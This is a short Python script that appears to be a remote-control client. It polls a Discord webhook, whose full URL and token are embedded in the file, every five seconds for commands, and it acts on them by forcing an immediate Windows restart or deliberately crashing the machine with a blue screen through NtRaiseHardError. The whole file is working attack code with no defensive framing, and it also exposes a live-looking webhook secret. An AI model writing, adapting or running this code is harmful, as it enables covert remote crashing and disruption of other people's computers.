import ctypes
import subprocess
import time
import requests

# === Setup ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1356810627909419079/5L26qDamgl753mBQL873Mq982SK6K4_2HH-mMmrfkOASId1GXyup-vVKOXbbDw6OC2iO"  # Your Discord Webhook URL

# === BSOD Trigger ===
def trigger_bsod():
    """Trigger a BSOD (Blue Screen of Death)"""
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except Exception as e:
        print(f"[!] BSOD failed: {e}")

# === Command Functionality ===
def execute_command(command):
    """Executes commands received from the webhook."""
    if command == "RESTART":
        subprocess.call("shutdown /r /t 0", shell=True)  # Restart the PC
    elif command == "BSOD":
        trigger_bsod()  # Trigger a BSOD (Blue Screen)
    else:
        print(f"[!] Unknown command: {command}")

# === Webhook Command Polling ===
def check_for_commands():
    """Check the Discord Webhook for incoming commands."""
    while True:
        try:
            response = requests.get(WEBHOOK_URL)  # Fetch latest webhook message
            if response.status_code == 200:
                data = response.json()
                if 'content' in data:  # Look for the 'content' of the message
                    command = data['content'].strip()
                    if command:
                        print(f"[*] Received command: {command}")
                        execute_command(command)
        except Exception as e:
            print(f"[!] Failed to check commands: {e}")
        
        # Check every 5 seconds (can be adjusted)
        time.sleep(5)

# Start the command polling thread
import threading
threading.Thread(target=check_for_commands, daemon=True).start()

# Keep the client running
while True:
    time.sleep(5)  # Keep the client alive
